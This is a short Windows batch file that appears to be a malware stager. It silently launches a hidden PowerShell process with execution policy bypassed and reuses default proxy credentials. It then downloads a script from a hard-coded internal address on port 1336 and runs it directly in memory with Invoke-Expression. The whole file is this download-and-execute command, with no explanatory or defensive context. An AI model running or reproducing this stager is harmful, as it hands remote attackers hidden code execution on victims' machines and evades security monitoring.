@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.100.7:1336/download/powershell/VG9rZW5cQWxsXDE6aXJvbnB5dGhvbl9hbXNp') -UseBasicParsing|iex"
